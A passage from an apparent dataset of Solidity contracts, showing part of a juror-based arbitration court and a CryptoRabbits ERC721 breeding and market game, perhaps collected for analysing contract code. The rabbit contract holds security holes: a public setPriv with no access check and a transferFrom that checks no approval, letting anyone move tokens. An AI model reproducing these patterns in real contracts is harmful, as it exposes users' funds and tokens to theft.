timePerPeriod[uint8(period)]);\n if (period == Period.Activation) {\n rnBlock = block.number + 1;\n rng.requestRN(rnBlock);\n period = Period.Draw;\n } else if (period == Period.Draw) {\n randomNumber = rng.getUncorrelatedRN(rnBlock);\n require(randomNumber != 0);\n period = Period.Vote;\n } else if (period == Period.Vote) {\n period = Period.Appeal;\n } else if (period == Period.Appeal) {\n period = Period.Execution;\n } else if (period == Period.Execution) {\n period = Period.Activation;\n ++session;\n segmentSize = 0;\n rnBlock = 0;\n randomNumber = 0;\n }\n lastPeriodChange = now;\n NewPeriod(period, session);\n }\n function activateTokens(uint _value) public onlyDuring(Period.Activation) {\n Juror storage juror = jurors[msg.sender];\n require(_value <= juror.balance);\n require(_value >= minActivatedToken);\n require(juror.lastSession != session);\n juror.lastSession = session;\n juror.segmentStart = segmentSize;\n segmentSize += _value;\n juror.segmentEnd = segmentSize;\n }\n function voteRuling(uint _disputeID, uint _ruling, uint[] _draws) public onlyDuring(Period.Vote) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[msg.sender];\n VoteCounter storage voteCounter = dispute.voteCounter[dispute.appeals];\n require(dispute.lastSessionVote[msg.sender] != session);\n require(_ruling <= dispute.choices);\n require(validDraws(msg.sender, _disputeID, _draws));\n dispute.lastSessionVote[msg.sender] = session;\n voteCounter.voteCount[_ruling] += _draws.length;\n if (voteCounter.winningCount < voteCounter.voteCount[_ruling]) {\n voteCounter.winningCount = voteCounter.voteCount[_ruling];\n voteCounter.winningChoice = _ruling;\n } else if (voteCounter.winningCount==voteCounter.voteCount[_ruling] && _draws.length!=0) {\n voteCounter.winningChoice = 0;\n }\n for (uint i = 0; i < _draws.length; ++i) {\n dispute.votes[dispute.appeals].push(Vote({\n account: msg.sender,\n ruling: _ruling\n }));\n }\n juror.atStake += _draws.length * getStakePerDraw();\n uint feeToPay = _draws.length * dispute.arbitrationFeePerJuror;\n msg.sender.transfer(feeToPay);\n ArbitrationReward(msg.sender, _disputeID, feeToPay);\n }\n function penalizeInactiveJuror(address _jurorAddress, uint _disputeID, uint[] _draws) public {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage inactiveJuror = jurors[_jurorAddress];\n require(period > Period.Vote);\n require(dispute.lastSessionVote[_jurorAddress] != session);\n dispute.lastSessionVote[_jurorAddress] = session;\n require(validDraws(_jurorAddress, _disputeID, _draws));\n uint penality = _draws.length * minActivatedToken * 2 * alpha / ALPHA_DIVISOR;\n penality = (penality < inactiveJuror.balance) ? penality : inactiveJuror.balance;\n inactiveJuror.balance -= penality;\n TokenShift(_jurorAddress, _disputeID, -int(penality));\n jurors[msg.sender].balance += penality / 2;\n TokenShift(msg.sender, _disputeID, int(penality / 2));\n jurors[governor].balance += penality / 2;\n TokenShift(governor, _disputeID, int(penality / 2));\n msg.sender.transfer(_draws.length*dispute.arbitrationFeePerJuror);\n }\n function oneShotTokenRepartition(uint _disputeID) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state == DisputeState.Open);\n require(dispute.session+dispute.appeals <= session);\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n for (uint i = 0; i <= dispute.appeals; ++i) {\n if (winningChoice!=0 || (dispute.voteCounter[dispute.appeals].voteCount[0] == dispute.voteCounter[dispute.appeals].winningCount)) {\n uint totalToRedistribute = 0;\n uint nbCoherent = 0;\n for (uint j = 0; j < dispute.votes[i].length; ++j) {\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n totalToRedistribute += penalty;\n } else {\n ++nbCoherent;\n }\n }\n if (nbCoherent == 0) {\n jurors[governor].balance += totalToRedistribute;\n TokenShift(governor, _disputeID, int(totalToRedistribute));\n } else {\n uint toRedistribute = totalToRedistribute / nbCoherent;\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n }\n }\n }\n for (j = 0; j < dispute.votes[i].length; ++j) {\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function multipleShotTokenRepartition(uint _disputeID, uint _maxIterations) public onlyDuring(Period.Execution) {\n Dispute storage dispute = disputes[_disputeID];\n require(dispute.state <= DisputeState.Resolving);\n require(dispute.session+dispute.appeals <= session);\n dispute.state = DisputeState.Resolving;\n uint winningChoice = dispute.voteCounter[dispute.appeals].winningChoice;\n uint amountShift = getStakePerDraw();\n uint currentIterations = 0;\n for (uint i = dispute.currentAppealToRepartition; i <= dispute.appeals; ++i) {\n if (dispute.appealsRepartitioned.length < i+1) {\n dispute.appealsRepartitioned.length++;\n }\n if (winningChoice==0 && (dispute.voteCounter[dispute.appeals].voteCount[0] != dispute.voteCounter[dispute.appeals].winningCount)) {\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Incoherent) {\n for (uint j = dispute.appealsRepartitioned[i].currentIncoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n Vote storage vote = dispute.votes[i][j];\n if (vote.ruling != winningChoice) {\n Juror storage juror = jurors[vote.account];\n uint penalty = amountShift<juror.balance ? amountShift : juror.balance;\n juror.balance -= penalty;\n TokenShift(vote.account, _disputeID, int(-penalty));\n dispute.appealsRepartitioned[i].totalToRedistribute += penalty;\n } else {\n ++dispute.appealsRepartitioned[i].nbCoherent;\n }\n ++dispute.appealsRepartitioned[i].currentIncoherentVote;\n ++currentIterations;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Coherent;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Coherent) {\n if (dispute.appealsRepartitioned[i].nbCoherent == 0) {\n jurors[governor].balance += dispute.appealsRepartitioned[i].totalToRedistribute;\n TokenShift(governor, _disputeID, int(dispute.appealsRepartitioned[i].totalToRedistribute));\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n } else {\n uint toRedistribute = dispute.appealsRepartitioned[i].totalToRedistribute / dispute.appealsRepartitioned[i].nbCoherent;\n for (j = dispute.appealsRepartitioned[i].currentCoherentVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n if (vote.ruling == winningChoice) {\n juror = jurors[vote.account];\n juror.balance += toRedistribute;\n TokenShift(vote.account, _disputeID, int(toRedistribute));\n }\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentCoherentVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.AtStake;\n }\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.AtStake) {\n for (j = dispute.appealsRepartitioned[i].currentAtStakeVote; j < dispute.votes[i].length; ++j) {\n if (currentIterations >= _maxIterations) {\n return;\n }\n vote = dispute.votes[i][j];\n juror = jurors[vote.account];\n juror.atStake -= amountShift;\n ++currentIterations;\n ++dispute.appealsRepartitioned[i].currentAtStakeVote;\n }\n dispute.appealsRepartitioned[i].stage = RepartitionStage.Complete;\n }\n if (dispute.appealsRepartitioned[i].stage == RepartitionStage.Complete) {\n ++dispute.currentAppealToRepartition;\n }\n }\n dispute.state = DisputeState.Executable;\n }\n function amountJurors(uint _disputeID) public view returns (uint nbJurors) {\n Dispute storage dispute = disputes[_disputeID];\n return (dispute.initialNumberJurors + 1) * 2**dispute.appeals - 1;\n }\n function validDraws(address _jurorAddress, uint _disputeID, uint[] _draws) public view returns (bool valid) {\n uint draw = 0;\n Juror storage juror = jurors[_jurorAddress];\n Dispute storage dispute = disputes[_disputeID];\n uint nbJurors = amountJurors(_disputeID);\n if (juror.lastSession != session) return false;\n if (dispute.session+dispute.appeals != session) return false;\n if (period <= Period.Draw) return false;\n for (uint i = 0; i < _draws.length; ++i) {\n if (_draws[i] <= draw) return false;\n draw = _draws[i];\n if (draw > nbJurors) return false;\n uint position = uint(keccak256(randomNumber, _disputeID, draw)) % segmentSize;\n require(position >= juror.segmentStart);\n require(position < juror.segmentEnd);\n }\n return true;\n }\n function createDispute(uint _choices, bytes _extraData) public payable returns (uint disputeID) {\n uint16 nbJurors = extraDataToNbJurors(_extraData);\n require(msg.value >= arbitrationCost(_extraData));\n disputeID = disputes.length++;\n Dispute storage dispute = disputes[disputeID];\n dispute.arbitrated = Arbitrable(msg.sender);\n if (period < Period.Draw)\n dispute.session = session;\n else\n dispute.session = session+1;\n dispute.choices = _choices;\n dispute.initialNumberJurors = nbJurors;\n dispute.arbitrationFeePerJuror = arbitrationFeePerJuror;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n DisputeCreation(disputeID, Arbitrable(msg.sender));\n return disputeID;\n }\n function appeal(uint _disputeID, bytes _extraData) public payable onlyDuring(Period.Appeal) {\n super.appeal(_disputeID,_extraData);\n Dispute storage dispute = disputes[_disputeID];\n require(msg.value >= appealCost(_disputeID, _extraData));\n require(dispute.session+dispute.appeals == session);\n require(dispute.arbitrated == msg.sender);\n dispute.appeals++;\n dispute.votes.length++;\n dispute.voteCounter.length++;\n }\n function executeRuling(uint disputeID) public {\n Dispute storage dispute = disputes[disputeID];\n require(dispute.state == DisputeState.Executable);\n dispute.state = DisputeState.Executed;\n dispute.arbitrated.rule(disputeID, dispute.voteCounter[dispute.appeals].winningChoice);\n }\n function arbitrationCost(bytes _extraData) public view returns (uint fee) {\n return extraDataToNbJurors(_extraData) * arbitrationFeePerJuror;\n }\n function appealCost(uint _disputeID, bytes _extraData) public view returns (uint fee) {\n Dispute storage dispute = disputes[_disputeID];\n if(dispute.appeals >= maxAppeals) return NON_PAYABLE_AMOUNT;\n return (2*amountJurors(_disputeID) + 1) * dispute.arbitrationFeePerJuror;\n }\n function extraDataToNbJurors(bytes _extraData) internal view returns (uint16 nbJurors) {\n if (_extraData.length < 2)\n return defaultNumberJuror;\n else\n return (uint16(_extraData[0]) << 8) + uint16(_extraData[1]);\n }\n function getStakePerDraw() public view returns (uint minActivatedTokenInAlpha) {\n return (alpha * minActivatedToken) / ALPHA_DIVISOR;\n }\n function getVoteAccount(uint _disputeID, uint _appeals, uint _voteID) public view returns (address account) {\n return disputes[_disputeID].votes[_appeals][_voteID].account;\n }\n function getVoteRuling(uint _disputeID, uint _appeals, uint _voteID) public view returns (uint ruling) {\n return disputes[_disputeID].votes[_appeals][_voteID].ruling;\n }\n function getWinningChoice(uint _disputeID, uint _appeals) public view returns (uint winningChoice) {\n return disputes[_disputeID].voteCounter[_appeals].winningChoice;\n }\n function getWinningCount(uint _disputeID, uint _appeals) public view returns (uint winningCount) {\n return disputes[_disputeID].voteCounter[_appeals].winningCount;\n }\n function getVoteCount(uint _disputeID, uint _appeals, uint _choice) public view returns (uint voteCount) {\n return disputes[_disputeID].voteCounter[_appeals].voteCount[_choice];\n }\n function getLastSessionVote(uint _disputeID, address _juror) public view returns (uint lastSessionVote) {\n return disputes[_disputeID].lastSessionVote[_juror];\n }\n function isDrawn(uint _disputeID, address _juror, uint _draw) public view returns (bool drawn) {\n Dispute storage dispute = disputes[_disputeID];\n Juror storage juror = jurors[_juror];\n if (juror.lastSession != session\n || (dispute.session+dispute.appeals != session)\n || period<=Period.Draw\n || _draw>amountJurors(_disputeID)\n || _draw==0\n || segmentSize==0\n ) {\n return false;\n } else {\n uint position = uint(keccak256(randomNumber,_disputeID,_draw)) % segmentSize;\n return (position >= juror.segmentStart) && (position < juror.segmentEnd);\n }\n }\n function currentRuling(uint _disputeID) public view returns (uint ruling) {\n Dispute storage dispute = disputes[_disputeID];\n return dispute.voteCounter[dispute.appeals].winningChoice;\n }\n function disputeStatus(uint _disputeID) public view returns (DisputeStatus status) {\n Dispute storage dispute = disputes[_disputeID];\n if (dispute.session+dispute.appeals < session)\n return DisputeStatus.Solved;\n else if(dispute.session+dispute.appeals == session) {\n if (dispute.state == DisputeState.Open) {\n if (period < Period.Appeal)\n return DisputeStatus.Waiting;\n else if (period == Period.Appeal)\n return DisputeStatus.Appealable;\n else return DisputeStatus.Solved;\n } else return DisputeStatus.Solved;\n } else return DisputeStatus.Waiting;\n }\n function executeOrder(bytes32 _data, uint _value, address _target) public onlyGovernor {\n _target.call.value(_value)(_data);\n }\n function setRng(RNG _rng) public onlyGovernor {\n rng = _rng;\n }\n function setArbitrationFeePerJuror(uint _arbitrationFeePerJuror) public onlyGovernor {\n arbitrationFeePerJuror = _arbitrationFeePerJuror;\n }\n function setDefaultNumberJuror(uint16 _defaultNumberJuror) public onlyGovernor {\n defaultNumberJuror = _defaultNumberJuror;\n }\n function setMinActivatedToken(uint _minActivatedToken) public onlyGovernor {\n minActivatedToken = _minActivatedToken;\n }\n function setTimePerPeriod(uint[5] _timePerPeriod) public onlyGovernor {\n timePerPeriod = _timePerPeriod;\n }\n function setAlpha(uint _alpha) public onlyGovernor {\n alpha = _alpha;\n }\n function setMaxAppeals(uint _maxAppeals) public onlyGovernor {\n maxAppeals = _maxAppeals;\n }\n function setGovernor(address _governor) public onlyGovernor {\n governor = _governor;\n }\n}",
  "extract_feature": [
    "function balanceOf(address _owner) public constant returns (uint256 balance) {\nreturn balanceOfAt(_owner, block.number);\n}",
    "function totalSupply() public constant returns (uint) {\nreturn totalSupplyAt(block.number);\n}",
    "function saveRN(uint _block) public {\nif (_block<block.number && randomNumber[_block]==0) {\nif (blockhash(_block)!=0x0)\nrandomNumber[_block]=uint(blockhash(_block));\nelse\nrandomNumber[_block]=uint(blockhash(block.number-1));\n}\nif (randomNumber[_block] != 0) {\nuint rewardToSend=reward[_block];\nreward[_block]=0;\nmsg.sender.send(rewardToSend);\n}\n}",
    "function passPeriod() public {\nrequire(now-lastPeriodChange >= timePerPeriod[uint8(period)]);\nif (period == Period.Activation) {\nrnBlock = block.number + 1;\nrng.requestRN(rnBlock);\nperiod = Period.Draw;\n} else if (period == Period.Draw) {\nrandomNumber = rng.getUncorrelatedRN(rnBlock);\nrequire(randomNumber != 0);\nperiod = Period.Vote;\n} else if (period == Period.Vote) {\nperiod = Period.Appeal;\n} else if (period == Period.Appeal) {\nperiod = Period.Execution;\n} else if (period == Period.Execution) {\nperiod = Period.Activation;\n++session;\nsegmentSize = 0;\nrnBlock = 0;\nrandomNumber = 0;\n}\nlastPeriodChange = now;\nNewPeriod(period, session);\n}"
  ]
},
{
  "_id": {
    "$oid": "663abc6d750a970a4fdc0b8a"
  },
  "filename": "434.sol",
  "content": "pragma solidity ^0.4.23;\ncontract Ownable {\n address public ownerCEO;\n address ownerMoney;\n address ownerServer;\n address privAddress;\n constructor() public {\n ownerCEO = msg.sender;\n ownerServer = msg.sender;\n ownerMoney = msg.sender;\n }\n modifier onlyOwner() {\n require(msg.sender == ownerCEO);\n _;\n }\n modifier onlyServer() {\n require(msg.sender == ownerServer || msg.sender == ownerCEO);\n _;\n }\n function transferOwnership(address add) public onlyOwner {\n if (add != address(0)) {\n ownerCEO = add;\n }\n }\n function transferOwnershipServer(address add) public onlyOwner {\n if (add != address(0)) {\n ownerServer = add;\n }\n }\n function transferOwnerMoney(address _ownerMoney) public onlyOwner {\n if (_ownerMoney != address(0)) {\n ownerMoney = _ownerMoney;\n }\n }\n function getOwnerMoney() public view onlyOwner returns(address) {\n return ownerMoney;\n }\n function getOwnerServer() public view onlyOwner returns(address) {\n return ownerServer;\n }\n function getPrivAddress() public view onlyOwner returns(address) {\n return privAddress;\n }\n}\nlibrary SafeMath {\n function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n if (a == 0) {\n return 0;\n }\n uint c = a * b;\n assert(c / a == b);\n return c;\n }\n function div(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a / b;\n return c;\n }\n function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n assert(b <= a);\n return a - b;\n }\n function add(uint256 a, uint256 b) internal pure returns (uint256) {\n uint256 c = a + b;\n assert(c >= a);\n return c;\n }\n}\ncontract BaseRabbit is Ownable {\n event SendBunny(address newOwnerBunny, uint32 bunnyId);\n event StopMarket(uint32 bunnyId);\n event StartMarket(uint32 bunnyId, uint money);\n event BunnyBuy(uint32 bunnyId, uint money);\n event EmotherCount(uint32 mother, uint summ);\n event NewBunny(uint32 bunnyId, uint dnk, uint256 blocknumber, uint breed );\n event ChengeSex(uint32 bunnyId, bool sex, uint256 price);\n event SalaryBunny(uint32 bunnyId, uint cost);\n event CreateChildren(uint32 matron, uint32 sire, uint32 child);\n event BunnyName(uint32 bunnyId, string name);\n event BunnyDescription(uint32 bunnyId, string name);\n event CoolduwnMother(uint32 bunnyId, uint num);\n event Transfer(address from, address to, uint32 tokenId);\n event Approval(address owner, address approved, uint32 tokenId);\n event OwnerBunnies(address owner, uint32 tokenId);\n address public myAddr_test = 0x982a49414fD95e3268D3559540A67B03e40AcD64;\n using SafeMath for uint256;\n bool pauseSave = false;\n uint256 bigPrice = 0.0005 ether;\n uint public commission_system = 5;\n uint32 public lastIdGen0;\n uint public totalGen0 = 0;\n uint public lastTimeGen0;\n uint public timeRangeCreateGen0 = 1;\n uint public promoGen0 = 2500;\n uint public promoMoney = 1*bigPrice;\n bool public promoPause = false;\n function setPromoGen0(uint _promoGen0) public onlyOwner {\n promoGen0 = _promoGen0;\n }\n function setPromoPause() public onlyOwner {\n promoPause = !promoPause;\n }\n function setPromoMoney(uint _promoMoney) public onlyOwner {\n promoMoney = _promoMoney;\n }\n modifier timeRange() {\n require((lastTimeGen0+timeRangeCreateGen0) < now);\n _;\n }\n mapping(uint32 => uint) public totalSalaryBunny;\n mapping(uint32 => uint32[5]) public rabbitMother;\n mapping(uint32 => uint) public motherCount;\n mapping(uint32 => uint) public rabbitBreedCount;\n mapping(uint32 => uint) public rabbitSirePrice;\n mapping(uint => uint32[]) public sireGenom;\n mapping (uint32 => uint) mapDNK;\n uint32[12] public cooldowns = [\n uint32(1 minutes),\n uint32(2 minutes),\n uint32(4 minutes),\n uint32(8 minutes),\n uint32(16 minutes),\n uint32(32 minutes),\n uint32(1 hours),\n uint32(2 hours),\n uint32(4 hours),\n uint32(8 hours),\n uint32(16 hours),\n uint32(1 days)\n ];\n struct Rabbit {\n uint32 mother;\n uint32 sire;\n uint birthblock;\n uint birthCount;\n uint birthLastTime;\n uint role;\n uint genome;\n }\n Rabbit[] public rabbits;\n mapping (uint32 => address) public rabbitToOwner;\n mapping(address => uint32[]) public ownerBunnies;\n mapping (uint32 => string) rabbitDescription;\n mapping (uint32 => string) rabbitName;\n mapping (uint32 => bool) giffblock;\n mapping (address => bool) ownerGennezise;\n}\ncontract ERC721 {\n function ownerOf(uint32 _tokenId) public view returns (address owner);\n function approve(address _to, uint32 _tokenId) public returns (bool success);\n function transfer(address _to, uint32 _tokenId) public;\n function transferFrom(address _from, address _to, uint32 _tokenId) public returns (bool);\n function totalSupply() public view returns (uint total);\n function balanceOf(address _owner) public view returns (uint balance);\n}\ncontract PrivateRabbitInterface {\n function getNewRabbit(address from) public view returns (uint);\n function mixDNK(uint dnkmother, uint dnksire, uint genome) public view returns (uint);\n function isUIntPrivate() public pure returns (bool);\n}\ncontract BodyRabbit is BaseRabbit, ERC721 {\n uint public totalBunny = 0;\n string public constant name = \"CryptoRabbits\";\n string public constant symbol = \"CRB\";\n PrivateRabbitInterface privateContract;\n function setPriv(address _privAddress) public returns(bool) {\n privAddress = _privAddress;\n privateContract = PrivateRabbitInterface(_privAddress);\n }\n bool public fcontr = false;\n constructor() public {\n setPriv(myAddr_test);\n fcontr = true;\n }\n function isPriv() public view returns(bool) {\n return privateContract.isUIntPrivate();\n }\n modifier checkPrivate() {\n require(isPriv());\n _;\n }\n function ownerOf(uint32 _tokenId) public view returns (address owner) {\n return rabbitToOwner[_tokenId];\n }\n function approve(address _to, uint32 _tokenId) public returns (bool) {\n _to;\n _tokenId;\n return false;\n }\n function removeTokenList(address _owner, uint32 _tokenId) internal {\n uint count = ownerBunnies[_owner].length;\n for (uint256 i = 0; i < count; i++) {\n if(ownerBunnies[_owner][i] == _tokenId)\n {\n delete ownerBunnies[_owner][i];\n if(count > 0 && count != (i-1)){\n ownerBunnies[_owner][i] = ownerBunnies[_owner][(count-1)];\n delete ownerBunnies[_owner][(count-1)];\n }\n ownerBunnies[_owner].length--;\n return;\n }\n }\n }\n function getSirePrice(uint32 _tokenId) public view returns(uint) {\n if(rabbits[(_tokenId-1)].role == 1){\n uint procent = (rabbitSirePrice[_tokenId] / 100);\n uint res = procent.mul(25);\n uint system = procent.mul(commission_system);\n res = res.add(rabbitSirePrice[_tokenId]);\n return res.add(system);\n } else {\n return 0;\n }\n }\n function addTokenList(address owner, uint32 _tokenId) internal {\n ownerBunnies[owner].push( _tokenId);\n emit OwnerBunnies(owner, _tokenId);\n rabbitToOwner[_tokenId] = owner;\n }\n function transfer(address _to, uint32 _tokenId) public {\n address currentOwner = msg.sender;\n address oldOwner = rabbitToOwner[_tokenId];\n require(rabbitToOwner[_tokenId] == msg.sender);\n require(currentOwner != _to);\n require(_to != address(0));\n removeTokenList(oldOwner, _tokenId);\n addTokenList(_to, _tokenId);\n emit Transfer(oldOwner, _to, _tokenId);\n }\n function transferFrom(address _from, address _to, uint32 _tokenId) public returns(bool) {\n address oldOwner = rabbitToOwner[_tokenId];\n require(oldOwner == _from);\n require(oldOwner != _to);\n require(_to != address(0));\n removeTokenList(oldOwner, _tokenId);\n addTokenList(_to, _tokenId);\n emit Transfer (oldOwner, _to, _tokenId);\n return true;\n }\n function setTimeRangeGen0(uint _sec) public onlyOwner {\n timeRangeCreateGen0 = _sec;\n }\n function isPauseSave() public view returns(bool) {\n return !pauseSave;\n }\n function isPromoPause() public view returns(bool) {\n if(msg.sender == ownerServer || msg.sender == ownerCEO){\n return true;\n }else{\n return !promoPause;\n }\n }\n function setPauseSave() public onlyOwner returns(bool) {\n return pauseSave = !pauseSave;\n }\n function isUIntPublic() public pure returns(bool) {\n return true;\n }\n function getTokenOwner(address owner) public view returns(uint total, uint32[] list) {\n total = ownerBunnies[owner].length;\n list = ownerBunnies[owner];\n }\n function setRabbitMother(uint32 children, uint32 mother) internal {\n require(children != mother);\n if (mother == 0 )\n {\n return;\n }\n uint32[11] memory pullMother;\n uint start = 0;\n for (uint i = 0; i < 5; i++) {\n if (rabbitMother[mother][i] != 0) {\n pullMother[start] = uint32(rabbitMother[mother][i]);\n rabbitMother[mother][i] = 0;\n start++;\n }\n }\n pullMother[start] = mother;\n start++;\n for (uint m = 0; m < 5; m++) {\n if(start > 5){\n rabbitMother[children][m] = pullMother[(m+1)];\n }else{\n rabbitMother[children][m] = pullMother[m];\n }\n }\n setMotherCount(mother);\n }\n function setMotherCount(uint32 _mother) internal returns(uint) {\n motherCount[_mother] = motherCount[_mother].add(1);\n emit EmotherCount(_mother, motherCount[_mother]);\n return motherCount[_mother];\n }\n function getMotherCount(uint32 _mother) public view returns(uint) {\n return motherCount[_mother];\n }\n function getTotalSalaryBunny(uint32 _bunny) public view returns(uint) {\n return totalSalaryBunny[_bunny];\n }\n function getRabbitMother( uint32 mother) public view returns(uint32[5]){\n return rabbitMother[mother];\n }\n function getRabbitMotherSumm(uint32 mother) public view returns(uint count) {\n for (uint m = 0; m < 5 ; m++) {\n if(rabbitMother[mother][m] != 0 ) {\n count++;\n }\n }\n }\n function getRabbitDNK(uint32 bunnyid) public view returns(uint) {\n return mapDNK[bunnyid];\n }\n function bytes32ToString(bytes32 x)internal pure returns (string) {\n bytes memory bytesString = new bytes(32);\n uint charCount = 0;\n for (uint j = 0; j < 32; j++) {\n byte char = byte(bytes32(uint(x) * 2 ** (8 * j)));\n if (char != 0) {\n bytesString[charCount] = char;\n charCount++;\n }\n }\n bytes memory bytesStringTrimmed = new bytes(charCount);\n for (j = 0; j < charCount; j++) {\n bytesStringTrimmed[j] = bytesString[j];\n }\n return string(bytesStringTrimmed);\n }\n function uintToBytes(uint v) internal pure returns (bytes32 ret) {\n if (v == 0) {\n ret = '0';\n } else {\n while (v > 0) {\n ret = bytes32(uint(ret) / (2 ** 8));\n ret |= bytes32(((v % 10) + 48) * 2 ** (8 * 31));\n v /= 10;\n }\n }\n return ret;\n }\n function totalSupply() public view returns (uint total) {\n return totalBunny;\n }\n function balanceOf(address _owner) public view returns (uint) {\n return ownerBunnies[_owner].length;\n }\n function sendMoney(address _to, uint256 _money) internal {\n _to.transfer((_money/100)*95);\n ownerMoney.transfer((_money/100)*5);\n }\n function getGiffBlock(uint32 _bunnyid) public view returns(bool) {\n return !giffblock[_bunnyid];\n }\n function getOwnerGennezise(address _to) public view returns(bool) {\n return ownerGennezise[_to];\n }\n function getBunny(uint32 _bunny) public view returns(\n uint32 mother,\n uint32 sire,\n uint birthblock,\n uint birthCount,\n uint birthLastTime,\n uint role,\n uint genome,\n bool interbreed,\n uint leftTime,\n uint lastTime,\n uint price,\n uint motherSumm\n )\n {\n price = getSirePrice(_bunny);\n _bunny = _bunny - 1;\n mother = rabbits[_bunny].mother;\n sire = rabbits[_bunny].sire;\n birthblock = rabbits[_bunny].birthblock;\n birthCount = rabbits[_bunny].birthCount;\n birthLastTime = rabbits[_bunny].birthLastTime;\n role = rabbits[_bunny].role;\n genome = rabbits[_bunny].genome;\n if(birthCount > 14) {\n birthCount = 14;\n }\n motherSumm = motherCount[_bunny];\n lastTime = uint(cooldowns[birthCount]);\n lastTime = lastTime.add(birthLastTime);\n if(lastTime <= now) {\n interbreed = true;\n } else {\n leftTime = lastTime.sub(now);\n }\n }\n function getBreed(uint32 _bunny) public view returns(\n bool interbreed\n )\n {\n _bunny = _bunny - 1;\n if(_bunny == 0) {\n return;\n }\n uint birtTime = rabbits[_bunny].birthLastTime;\n uint birthCount = rabbits[_bunny].birthCount;\n uint lastTime = uint(cooldowns[birthCount]);\n lastTime = lastTime.add(birtTime);\n if(lastTime <= now && rabbits[_bunny].role == 0 ) {\n interbreed = true;\n }\n }\n function getcoolduwn(uint32 _mother) public view returns(uint lastTime, uint cd, uint lefttime) {\n cd = rabbits[(_mother-1)].birthCount;\n if(cd > 14) {\n cd = 14;\n }\n lastTime = (cooldowns[cd] + rabbits[(_mother-1)].birthLastTime);\n if(lastTime > now) {\n lefttime = lastTime.sub(now);\n }\n }\n}\ncontract RabbitMarket is BodyRabbit {\n uint stepMoney = 2*60*60;\n function setStepMoney(uint money) public onlyOwner {\n stepMoney = money;\n }\n uint marketCount = 0;\n uint daysperiod = 1;\n uint sec = 1;\n uint8 middlelast = 20;\n mapping(uint32 => uint256[]) internal marketRabbits;\n uint256 middlePriceMoney = 1;\n uint256 middleSaleTime = 0;\n uint moneyRange;\n function setMoneyRange(uint _money) public onlyOwner {\n moneyRange = _money;\n }\n uint lastmoney = 0;\n uint lastTimeGen0;\n uint public totalClosedBID = 0;\n mapping (uint32 => uint) bunnyCost;\n mapping(uint32 => uint) bidsIndex;\n function currentPrice(uint32 _bunnyid) public view returns(uint) {\n uint money = bunnyCost[_bunnyid];\n if (money > 0) {\n uint moneyComs = money.div(100);\n moneyComs = moneyComs.mul(5);\n return money.add(moneyComs);\n }\n }\n function startMarket(uint32 _bunnyid, uint _money) public returns (uint) {\n require(isPauseSave());\n require(_money >= bigPrice);\n require(rabbitToOwner[_bunnyid] == msg.sender);\n bunnyCost[_bunnyid] = _money;\n emit StartMarket(_bunnyid, _money);\n return marketCount++;\n }\n function stopMarket(uint32 _bunnyid) public returns(uint) {\n require(isPauseSave());\n require(rabbitToOwner[_bunnyid] == msg.sender);\n bunnyCost[_bunnyid] = 0;\n emit StopMarket(_bunnyid);\n return marketCount--;\n }\n function buyBunny(uint32 _bunnyid) public payable {\n require(isPauseSave());\n require(rabbitToOwner[_bunnyid] != msg.sender);\n uint price = currentPrice(_bunnyid);\n require(msg.value >= price && 0 != price);\n totalClosedBID++;\n sendMoney(rabbitToOwner[_bunnyid], msg.value);\n transferFrom(rabbitToOwner[_bunnyid], msg.sender, _bunnyid);\n stopMarket(_bunnyid);\n emit BunnyBuy(_bunnyid, price);\n emit SendBunny (msg.sender, _bunnyid);\n }\n function giff(uint32 bunnyid, address add) public {\n require(rabbitToOwner[bunnyid] == msg.sender);\n require(!(giffblock[bunnyid]));\n transferFrom(msg.sender, add, bunnyid);\n }\n function getMarketCount() public view returns(uint) {\n return marketCount;\n }\n}\ncontract BunnyGame is RabbitMarket {\n function transferNewBunny(address _to, uint32 _bunnyid, uint localdnk, uint breed, uint32 matron, uint32 sire) internal {\n emit NewBunny(_bunnyid, localdnk, block.number, breed);\n emit CreateChildren(matron, sire, _bunnyid);\n addTokenList(_to, _bunnyid);\n totalSalaryBunny[_bunnyid] = 0;\n motherCount[_bunnyid] = 0;\n totalBunny++;\n }\n function createGennezise(uint32 _matron) public {\n bool promo = false;\n require(isPriv());\n require(isPauseSave());\n require(isPromoPause());\n if (totalGen0 > promoGen0) {\n require(msg.sender == ownerServer || msg.sender == ownerCEO);\n } else if (!(msg.sender == ownerServer || msg.sender == ownerCEO)) {\n require(!ownerGennezise[msg.sender]);\n ownerGennezise[msg.sender] = true;\n promo = true;\n }\n uint localdnk = privateContract.getNewRabbit(msg.sender);\n Rabbit memory _Rabbit = Rabbit( 0, 0, block.number, 0, 0, 0, 0);\n uint32 _bunnyid = uint32(rabbits.push(_Rabbit));\n mapDNK[_bunnyid] = localdnk;\n transferNewBunny(msg.sender, _bunnyid, localdnk, 0, 0, 0);\n lastTimeGen0 = now;\n lastIdGen0 = _bunnyid;\n 